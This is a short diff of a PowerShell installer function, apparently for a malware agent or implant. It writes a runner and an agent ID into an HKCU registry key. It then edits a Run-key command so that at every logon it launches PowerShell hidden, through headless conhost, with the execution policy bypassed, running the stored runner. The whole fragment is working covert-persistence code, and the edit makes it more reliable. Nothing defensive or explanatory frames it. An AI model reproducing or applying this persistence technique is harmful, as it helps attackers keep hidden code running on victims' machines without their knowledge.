@@ -189,8 +189,9 @@ function Install-AsUser {
     $k.Close()
     Write-Host "[+] Registry: HKCU\$REG_HKCU (R=runner, I=agentId $agentIdHex)"
 
+    $conhostFull = [System.IO.Path]::Combine($env:WINDIR, 'System32\conhost.exe')
     $psExeFull = [System.IO.Path]::Combine($env:WINDIR, 'System32\WindowsPowerShell\v1.0\powershell.exe')
-    $cmd = 'conhost.exe --headless ' +$psExeFull + ' -WindowStyle Hidden -ExecutionPolicy Bypass -Command "& {' + $runner + '}"'
+    $cmd = $conhostFull + ' --headless ' + $psExeFull + ' -WindowStyle Hidden -ExecutionPolicy Bypass -Command "& {' + $runner + '}"'
 
     Write-Host "[*] Writing Run key..."
     $rk = [Microsoft.Win32.Registry]::CurrentUser.OpenSubKey(
